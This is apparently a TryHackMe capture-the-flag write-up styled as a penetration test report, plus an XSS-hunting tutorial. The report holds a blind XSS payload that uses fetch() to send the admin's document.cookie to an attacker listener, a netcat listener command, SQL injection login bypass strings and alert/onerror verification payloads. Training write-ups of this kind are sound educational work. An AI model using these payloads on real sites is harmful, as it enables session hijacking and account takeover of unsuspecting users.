
# Penetration Test Report: Cupid's Matchmaker (TryHackMe)

**Date:** June 26, 2026

**Target IP:** 10.49.163.60

**Objective:** Exploitation & Session Hijacking via Blind XSS

---

## 1. Executive Summary

This report details the evaluation and exploit chain executed against the target infrastructure. Initial network scans revealed an active web application hosted on a development server. Attempts to directly breach the administrator login page via default credentials and SQL Injection (SQLi) were unsuccessful.

By analyzing the application's design narrative ("real humans read your survey"), the attack vector shifted to a **Blind Cross-Site Scripting (XSS)** vulnerability inside an unauthenticated survey form. A malicious JavaScript payload was injected, forcing an internal administrative process to exfiltrate its active session cookie to an attacker-controlled listener. This cookie was then used to hijack the administrative session and retrieve the final flag.

---

## 2. Reconnaissance & External Enumeration

An initial `nmap` service scan was launched against the target IP to establish the open port footprint:

```bash
nmap -sV -sC -A -T4 10.49.163.60

```

### Scan Results

| Port | State | Service | Version / Details |
| --- | --- | --- | --- |
| **22/tcp** | Open | SSH | OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 |
| **631/tcp** | Open | IPP | CUPS 2.4 (Status: Forbidden / v2.4.12) |
| **5000/tcp** | Open | HTTP | Werkzeug httpd 3.0.1 (Python 3.12.3) |

### Service Analysis

* **Port 631 (CUPS):** Evaluated for historical or recent remote code execution vectors (such as CVE-2024-47176). However, the specific version implementation returned a `Forbidden` status, rendering it a dead end.
* **Port 5000 (Werkzeug/Python):** This was flagged as the primary entry point. Running a Python development server (`Werkzeug`) in a production environment indicates a highly unstable deployment prone to structural vulnerabilities.

### Directory Fuzzing

Navigating to `[http://10.49.163.60:5000](http://10.49.163.60:5000)` revealed a standard login page. To uncover hidden routing, a directory scan was initiated:

```bash
gobuster dir -u http://10.49.163.60:5000 -w /usr/share/wordlists/dirb/common.txt

```

**Discovered Paths:**

* `/login` (The initial front-facing authentication page)
* `/logout`
* `/admin` (Restricted dashboard)
* `/survey` (An unauthenticated data submission form)

---

## 3. Attack Vector Determination

The initial login screen was tested for common web flaws, including:

1. **Default administrative logins** (`admin:admin`, `admin:password`).
2. **Authentication bypass payloads via SQL Injection** (`' OR 1=1 --`, `" OR 1=1 --`).

All standard bypass attempts failed. Reviewing the contextual hints provided by the application ("real humans review your application internally") shifted the strategy from direct authentication bypass to **Blind Cross-Site Scripting (XSS)**.

The objective was to input an active script into the `/survey` fields, which would lie dormant in the database until an automated administrative review bot loaded the backend `/admin` queue.

---

## 4. Exploitation & Session Hijacking

### Step 1: Deploying the Local Listener

To capture the incoming session data from the server, a local utility listener was established on the attacking machine's VPN interface (`tun0`):

```bash
nc -lvnp 8000

```

### Step 2: Crafting the Blind XSS Payload

The payload was designed to leverage the browser's Document Object Model (DOM) to fetch the administrator's active session cookie string and forward it as an HTTP query parameter to the attacker's IP.

```html
<script>fetch('http://<YOUR_VPN_IP>:8000/?cookie=' + document.cookie);</script>

```

### Step 3: Payload Injection

The operator navigated to `[http://10.49.163.60:5000/survey](http://10.49.163.60:5000/survey)` and pasted the exact script block into **every available text entry field** (Name, Bio, Interests) to maximize the probability of rendering execution. The form was then submitted.

### Step 4: Intercepting the Token

Within approximately 60 seconds, the admin bot opened the submission. The browser executed the raw script, generating the following connection back to the Netcat listener:

```http
CONNECT execution received from 10.49.163.60
GET /?cookie=eyJhZG1pbiI6dHJ1ZSwidXNlciI6ImN1cGlkX21hbmFnZXIifQ... HTTP/1.1
Host: <YOUR_VPN_IP>:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64...)
Accept: */*

```


---

# Technical Appendix: Technical Guide to Hunting XSS

Cross-Site Scripting (XSS) happens when a web application accepts untrusted user input and outputs it back to a webpage without proper sanitization or encoding, forcing a user's browser to execute malicious JavaScript.

## 1. How to Systematically Search for XSS

Rather than typing random scripts blindly, professional penetration testers follow a strict workflow called the **Canary Methodology**.

### Step A: Plant a Canary String

Identify any reflection point on the application (e.g., search bars, comment inputs, profile bio fields, URL parameters like `?q=`). Input a highly distinct, alphanumeric string that won't accidentally blend with standard code:

```text
canary99X

```

### Step B: Inspect the Reflection Context

Submit the form or parameter, right-click the webpage, and select **View Page Source** (or `Ctrl+U`). Search (`Ctrl+F`) for your canary string. Note exactly where it landed within the HTML tree:

1. **HTML Body Context:** Landed between standard paragraph or layout tags.
```html
<div>Search results for: canary99X</div>

```


2. **HTML Attribute Context:** Landed inside an existing element attribute field.
```html
<input type="text" name="user" value="canary99X">

```


3. **Inline JavaScript Context:** Landed directly within an active client-side script block.
```html
<script> let username = "canary99X"; </script>

```



---

## 2. Testing the Filter Constraints

Once you know where your input is being printed back to the page, you must determine if the application is safely filtering your characters. Send a modified canary payload containing the structural characters necessary to form code blocks:

```text
canary99X < > ' " ;

```

Look at the page source again to see how the application handled them:

### Scenario 1: The Site is Secure (Html Entity Encoding)

If the application converts your characters into safe string entities, the browser will display them visually but will never execute them as code.

* **What it looks like in the Source Code:**
```html
canary99X &lt; &gt; &apos; &quot; ;

```


* *Conclusion:* Safe. No vulnerability present.

### Scenario 2: The Site is Vulnerable (Raw Reflection)

If the server prints your special characters back to the document exactly as you typed them, the application is fundamentally broken.

* **What it looks like in the Source Code:**
```html
canary99X < > ' " ;

```


* *Conclusion:* **Vulnerable.** The web browser cannot distinguish between the original developer's code and your input characters.

---

## 3. How to Verify if XSS is Working

To definitively prove the existence of an XSS vulnerability without writing weaponized code, you use **Execution Proofs** based on the context you discovered.

### Context 1: Breaking Out of HTML Body

If your canary landed raw in the body, you can drop standard HTML element tags directly into the input field:

* **Verification Payload:**
```html
<script>alert(document.domain)</script>

```


* **Alternative Payload (if script tags are filtered):**
```html
<img src=x onerror=alert(1)>

```



### Context 2: Breaking Out of an Attribute

If your canary landed inside an attribute like `value="canary99X"`, simply typing a script tag will fail because it remains trapped inside the developer's quotation marks. You must use your special characters to close out the attribute and the element tag *first*:

* **Verification Payload:**
```text
"><script>alert(1)</script>

```


* **How the browser interprets it:**
```html
<input type="text" name="user" value=""><script>alert(1)</script>">

```


The injected `">` closes the original input tag early, allowing the browser to parse the trailing script tag as a brand new, executable command block.

When you see that pop-up box appear or catch that callback on your listener, the vulnerability is officially verified.
